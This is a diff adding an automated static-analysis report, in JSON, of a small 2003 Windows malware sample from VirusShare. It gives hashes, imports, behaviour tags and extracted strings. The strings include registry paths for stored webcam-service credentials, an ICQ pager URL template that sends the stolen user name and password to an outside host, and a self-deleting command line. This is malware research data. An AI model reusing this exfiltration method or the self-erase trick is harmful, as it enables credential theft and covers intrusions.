@@ -1,0 +1,187 @@
+{
+    "docinfo": {},
+    "filename": "VirusShare_1e9acbeb655bab21a1bdb854866ad0df",
+    "filesize": 1536,
+    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
+    "hashes": {
+        "md5": "1e9acbeb655bab21a1bdb854866ad0df",
+        "sha1": "d8c7806bb32e30c0b509acc3c09faf4c19c67f40",
+        "sha256": "0bedea3c5b657e482608e14b53604353bc830c28d4622776ba28ad67ea05b031"
+    },
+    "peinfo": {
+        "behavior": [
+            "Xor",
+            "network_dropper",
+            "win_registry"
+        ],
+        "breakpoint": [
+            "ExitProcess",
+            "GetModuleFileNameA",
+            "RegCloseKey",
+            "RegOpenKeyExA",
+            "URLDownloadToFileA",
+            "WinExec"
+        ],
+        "directories": {
+            "debug": {},
+            "export": [],
+            "import": {
+                "ADVAPI32.dll": [
+                    {
+                        "function": "RegCloseKey",
+                        "offset": 4198848
+                    },
+                    {
+                        "function": "RegOpenKeyExA",
+                        "offset": 4198852
+                    },
+                    {
+                        "function": "RegQueryValueExA",
+                        "offset": 4198856
+                    }
+                ],
+                "KERNEL32.dll": [
+                    {
+                        "function": "ExitProcess",
+                        "offset": 4198824
+                    },
+                    {
+                        "function": "GetModuleFileNameA",
+                        "offset": 4198828
+                    },
+                    {
+                        "function": "GetShortPathNameA",
+                        "offset": 4198832
+                    },
+                    {
+                        "function": "WinExec",
+                        "offset": 4198836
+                    },
+                    {
+                        "function": "lstrcatA",
+                        "offset": 4198840
+                    }
+                ],
+                "USER32.dll": [
+                    {
+                        "function": "wsprintfA",
+                        "offset": 4198816
+                    }
+                ],
+                "urlmon.dll": [
+                    {
+                        "function": "URLDownloadToFileA",
+                        "offset": 4198864
+                    }
+                ]
+            },
+            "relocations": {
+                "Size": 0,
+                "VirtualAddress": 0,
+                "count": 0,
+                "details": {}
+            },
+            "resources": [],
+            "sign": {},
+            "tls": {
+                "AddressOfCallBacks": 65535,
+                "AddressOfIndex": 4,
+                "Characteristics": 0,
+                "EndAddressOfRawData": 3,
+                "SizeOfZeroFill": 184,
+                "StartAddressOfRawData": 9460301
+            }
+        },
+        "dll": false,
+        "entrypoint": 4784,
+        "features": {
+            "antidbg": [],
+            "antivm": {},
+            "crypto": [],
+            "mutex": [],
+            "packer": [
+                "Microsoft_Visual_Basic_v50"
+            ],
+            "xor": {}
+        },
+        "imagebase": 4194304,
+        "imphash": "6ae804b01f09824c7104b586b483c9e3",
+        "metadata": {},
+        "sections": {
+            "count": 1,
+            "details": [
+                {
+                    "characteristics": 3758096416,
+                    "data": "b'http://web.icq.com/whitepages/page_me/1,,,00.htm",
+                    "entropy": 5.096963242839722,
+                    "executable": true,
+                    "hash": {
+                        "md5": "9e0e1a96bb98a3b0bb524c0a6ee3c63a",
+                        "sha1": "bb4649032e39c96776e693cc332d12700436d063",
+                        "sha256": "2f12ae256848282e90e1542db8daad1bdbb56fe1ed45351c75247011ba5102e5"
+                    },
+                    "section_name": ".text",
+                    "size_of_raw_data": 1024,
+                    "virtual_address": 4096,
+                    "virtual_size": 2013
+                }
+            ]
+        },
+        "timestamp": "2003-06-21 00:27:27"
+    },
+    "strings": {
+        "dump": [
+            "L!This program cannot be run in DOS mode.",
+            "vsVa",
+            "vsRich",
+            ".text",
+            "http://web.icq.com/whitepages/page_me/1,,,00.html?&from=Cam-Jacker&body=User-%s--Password-%s&fromemail=Jacked&to=%s",
+            "170294173",
+            "SOFTWARE\\WebCamNow\\Users\\Name\\",
+            "SOFTWARE\\WebCamNow\\Users\\Password\\",
+            "Command.com /C Choice.com /C:YN /N /T:Y,5|erase",
+            "wsprintfA",
+            "USER32.dll",
+            "ExitProcess",
+            "GetModuleFileNameA",
+            "GetShortPathNameA",
+            "WinExec",
+            "lstrcatA",
+            "KERNEL32.dll",
+            "RegCloseKey",
+            "RegOpenKeyExA",
+            "RegQueryValueExA",
+            "ADVAPI32.dll",
+            "URLDownloadToFileA",
+            "urlmon.dll"
+        ],
+        "file": {
+            "ADVAPI32.dll": "Library",
+            "KERNEL32.dll": "Library",
+            "USER32.dll": "Library",
+            "urlmon.dll": "Library"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://web.icq.com/whitepages/page_me/100.html?&from=Cam-Jacker&body=User-%s--Password-%s&fromemail=Jacked&to=%s"
+        ]
+    },
+    "time": "0:00:00.567882",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": [
+        {
+            "packer_compiler_signatures.yar": "IsPE32"
+        },
+        {
+            "packer_compiler_signatures.yar": "IsWindowsGUI"
+        },
+        {
+            "packer_compiler_signatures.yar": "HasRichSignature"
+        }
+    ]
+}
